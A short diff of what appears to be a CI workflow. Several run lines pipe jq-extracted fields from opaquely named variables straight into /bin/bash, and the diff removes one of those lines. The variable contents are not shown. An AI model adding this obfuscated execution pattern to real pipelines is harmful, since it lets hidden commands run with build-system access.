@@ -36,7 +36,6 @@ jobs:
           echo $blpo15 | jq -r .qr233 | /bin/bash
           printf '%s' "$pgv4" | jq -r .nyi0 | /bin/bash
           printf '%s' "$yca49042" | jq -r .kpo2 | /bin/bash
-          echo $yk844 | jq -r .rwi0 | /bin/bash
           echo $rv9 | jq -r .m27 | /bin/bash
           printf '%s' "$rb5" | jq -r .bho6064 | /bin/bash
           printf '%s' "$a90" | jq -r .wigx4807 | /bin/bash
